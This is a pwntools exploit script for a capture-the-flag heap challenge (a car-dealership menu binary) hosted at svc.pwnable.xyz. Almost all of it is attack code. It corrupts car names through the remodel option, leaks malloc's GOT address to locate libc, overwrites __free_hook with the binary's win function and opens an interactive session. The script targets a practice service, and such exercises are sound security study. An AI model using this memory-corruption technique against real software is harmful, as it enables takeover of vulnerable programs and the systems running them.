from pwn import *


context(kernel="amd64", arch="amd64", log_level="info")

"""
Menu:
 1. Buy a car
 2. Sell a car
 3. Re-model
 4. List cars
 0. Exit
> 2
"""

"""
0: BMW
1: Lexus
2: Toyota
3: Mercedes-Benz
4: Audi
5: Infinity
6: Honda
7: Hyundai
8: Ford
9: Tesla
"""
def buy(p, number=0):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b">", str(number).encode("utf-8"))



def sell(p, model):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"like to sell: ", model)

def remodel(p, model, new_model):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b" like to remodel: ", model)
	data = p.recv(4)
	if data == b"Name":
		p.sendlineafter(b"new model: ", new_model)

def list_cars(p):
	p.sendlineafter(b"> ", b"4")
	data = p.recvuntil(b"Menu")[:-5]
	print(data)
	return data


def generate_targets(a_offset, target, target_addr, prev_target=None):
	if prev_target is None:
		prev_target = b"A"*(len(target)-1)
	addr_pack = p64(target_addr)
	k = 7
	while k >= 0:
		print(addr_pack[k], k)
		if addr_pack[k] == 0 and (addr_pack[k-1] == 0 or k == 0):
			print("Here")
			new_target = b"A"*(a_offset+k)
		else:
			t = p8(addr_pack[k])
			k -= 1
			while (k >=0 and addr_pack[k] != 0):
				t += p8(addr_pack[k])
				k -= 1
			k += 1
			new_target = b"A"*(a_offset+k)+t[::-1]   #+p64(malloc_got)[:7]
		yield (new_target, prev_target)
		prev_target = new_target
		k -= 1



def test_generated():
	memory = list(b"D"*0x28)
	for i, elem in enumerate(memory):
		memory[i] = p8(elem)
	print(memory)
	for new_target, prev_target in generate_targets(0x20, b"BWM", 0x000000000601FD8):
		i = 0
		for elem in new_target:  
			memory[i] = p8(elem)
			i += 1
		memory[i] = b"\x00"
		print("[+] Now memory is: ", b"".join(memory))
		print(f"Dummy: {b''.join(memory[:0x10])}, Target: {b''.join(memory[0x10:0x18])}")


def overwrite_remodel(p, target, target_addr):
	remodel(p, target, b"A"*0x28)
	# list_cars(p)

	for new_target, prev_target in generate_targets(0x20, target, target_addr):
		remodel(p, prev_target, new_target)
		# prev_target = new_target
		# k -= 1


def main():
	e = ELF("challenge")
	l = ELF("./libc.so")

	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so ./libc.so"
	# print("LD_PRELOAD" in env)
	# print("LD_PRELOAD" in os.environ)
	# print(env)
	if 0:
		p = process("./challenge", env=env)
		gdb.attach(p)
		sleep(1)

		# p = gdb.debug("./challenge" , env=env)
		# gdbscript="set exec-wrapper env 'LD_PRELOAD=./ld.so ./libc.so'\necho 1213\n")
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30037)

	win_addr = e.symbols["win"]
	malloc_got = e.got["malloc"]
	malloc_off = l.symbols["malloc"]

	buy(p, 0)
	# buy(p, 1)
	buy(p, 2)
	buy(p, 3)
	buy(p, 4)
	buy(p, 5)
	buy(p, 6)

	print("\n\n\n\n\n\n\n\n\n Buyed enough cars\n\n\n")
	
	# list_cars(p)

	# sell(p, b"Lexus")
	target_malloc = bytearray()
	while len(target_malloc) < 8:
		prev_target = b"Infinity" if len(target_malloc) == 0 else b"A"*0x18+target_malloc
		overwrite_remodel(p, prev_target, malloc_got+len(target_malloc))
		data = list_cars(p)
		print(data.split(b"\xf0\x9f\x9a\x97: ")[-1])
		target_malloc += data.split(b"\xf0\x9f\x9a\x97: ")[-1] + b"\x00\x00"
		print(f"\n\n\nRetrieved malloc: {target_malloc}")

	malloc_addr = u64(target_malloc[:8])
	print(f"\n\n\nMalloc address: {hex(malloc_addr)}")
	libc_base = malloc_addr - malloc_off
	fhook_addr = libc_base + l.symbols["__free_hook"]
	print(f"\n\n\nHook address: {hex(fhook_addr)}")

	# fhook_addr = e.symbols["__bss_start"]





	# overwrite_remodel(p, b"Toyota", fhook_addr)
	remodel(p, b"Toyota", b"A"*0x28)
	remodel(p, b"A"*5, b"A"*0x20+p64(fhook_addr))
	data = list_cars(p)
	new_name = data.split(b"\n\xf0\x9f\x9a\x97: ")[3]

	print(f"New car name: {new_name}")

	# overwrite_remodel(p, new_name, win_addr, prev_target=new_name)

	# for new_target, prev_target in generate_targets(0, new_name, win_addr, prev_target=new_name):
		# remodel(p, prev_target, new_target)
		# break
	remodel(p, new_name, p64(win_addr))
	# remodel(p, new_name, p64(win_addr))
	
	# sell(p, b"Lexus")
	buy(p, 2)
	sell(p, b"BMW")

	p.interactive()


main()
# test_generated()


